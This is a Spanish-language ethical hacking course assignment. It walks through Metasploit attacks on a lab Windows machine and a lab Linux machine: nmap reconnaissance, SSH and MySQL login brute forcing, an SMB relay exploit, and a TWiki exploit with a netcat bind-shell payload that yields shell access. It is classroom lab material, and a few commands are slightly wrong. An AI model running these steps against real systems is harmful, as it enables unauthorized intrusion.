# Tarea: Hacking Ético

## Máquina Windows con vulnerabilidades
- Obtener información del sistema vulnerable
  	*Para saber la ip del dispositivo al que queremos atacar usaremos:*

  	  arp-scan -l

   	<br>
    
* Explorar e identificar vulnerabilidades del sistema

	*Para saber lo puertos que están abiertos utilizaremos*

  	  nmap *ip del servidor*

  	<br>
   
   	*Si queremos un puerto en especifipo nos sirve el -p*
  
+ Explotar las vulnerabilidades
  
  - Puerto 22 -> SSH

    *Con este comando hacemos uso del módulo ssh_login para iniciar sesión con posibles usuarios*
    
        use auxiliar/scanner/ssh/ssh_login

  	<br>
   
     *Mostramos las opciones*
    
        show options

  	<br>
   
    *Es obligatorio poner el target, en mi caso la IP es: 192.168.0.117*
    
        set RHOSTS 192.168.0.117

  	<br>
   
    *Creamos unalista de posibles usuarios y otra con posibles contraseñas*
    
        set USER_FILE usuarios.txt
        set PASS_FILE usuarios.txt

  	<br>
   
    *Con run se intentará iniciar sesión en el servidor SSH utilizando la lista de nombres de usuario y contraseñas*
    
        run

    <br>
    
  - Puerto 139 -> netbios-ssn

       *Para explotar este puerto necesitaremos explotar estos puertos*

   	    use exploit windows/smb/smb_relay 
 
       *Luego debemos poner el rhosts*

     	    set RHOSTS 192.168.0.117
   
       *Luego lo ejecutamos y ya tenemos acceso*

     	    run

      *Para comprobar que funciona hacemos un ls y debería salir el directorio "he de decir que no se por qué funcionó pero entré"*
      
## Máquina Linux con vulnerabilidades
- Obtener información del sistema vulnerable

    *Para saber la ip del Linux al que queremos ver vulnerabilidades usaremos:*

      nmap -sn *dir_red/mascara*

    <br>

* Explorar e identificar vulnerabilidades del sistema

    *Puedes saber los puertos que un linux tiene abiertos con:*

      nmap -sT *ip del cliente*

    <br>


+ Explotar las vulnerabilidades
  - Puerto 80 -> HTTP
 
     *Este comando carga el módulo de explotación llamado "twiki_history" que está diseñado para atacar vulnerabilidades en la aplicación web TWiki*
	
	    use exploit/unix/webapp/twiki_history

    *Muestra las opciones disponibles para configurar el módulo de explotación "twiki_history".*
    
    	show options
    
    *Establece la dirección IP del host al que se pretende atacar, en este caso 100.100.100.2.*
    
    	set rhost 100.100.100.2
    
    *Establece el payload que se utilizará en la explotación. En este caso, se utiliza "cmd/unix/bind_netcat", que esta diseñado para abrir una conexión usando Netcat en la máquina.*
    
    	set payload cmd/unix/bind_netcat
    
    *Ejecuta la explotación en segundo plano.*
    
    	exploit -j
    
    *Muestra una lista de las sesiones activas que se han establecido después de la explotación. Esto permite identificar si se ha obtenido acceso a la máquina.*
    
    	sessions -l
    
    *Cambia a un módulo de post-explotación llamado "shell_to_m". Se utiliza para interactuar con la máquina objetivo una vez hayamos accedido.*
    
    	use post/multi/manage/shell_to_m
    
    *Establece conexíon con la primera sesion iniciada para ejecutar el módulo "shell_to_m".*
    
    	set session 1
    
    *Ejecuta el módulo "shell_to_m" en la sesión número 1.*
    
    	exploit
    
    *Interactúa con la segunda sesión (sesión número 2), obteniendo acceso a la máquina vulnerable.*
    
    	sessions -i 2
    
    *Sale la IP de la máquina vulnerable una vez conectado.*
    
    	ifconfig
    	
    *Confirmación del acceso a la máquina vulnerable.*
    
    	cat /etc/hostname


    <br>
  
  - Puerto 3306 -> MySQL
 
    *Este comando indica el uso del módulo mysql_login para hacer una prueba de inicio de sesión MySQL, utilizando una lista de nombres de usuario y contraseñas.*
    
        use scanner/mysql/mysql_login
    
    *Muestra las opciones que se pueden configurar del módulo*
    
        show options
    
    *Establece la dirección IP de la máquina vulnerbale, en mi caso la IP es: 100.100.100.2.*
    
        set rhosts 100.100.100.2
    
    *Define el archivo unix_users.txt como la lista de posibles nombres de usuario y contraseñas para probar durante la prueba de inicio de sesión.*
    
        set userpass_file /usr/share/metasploit-framework/data/wordlists/unix_users.txt
    
    *Con run se intentará iniciar sesión en el servidor MySQL utilizando la lista de nombres de usuario y contraseñas del archivo unix_users.txt*
    
        run
 
    *En la lista de usuarios que saldrá que se han probado usamos el que ha podido iniciar la sesión con éxito, en mi caso root*
    
    *Luego en una terminal aparte ejecutamos el siguiente comando y pedira contraseña aunque está vacía*
    
        mysql -u root -h 100.100.100.2 -p
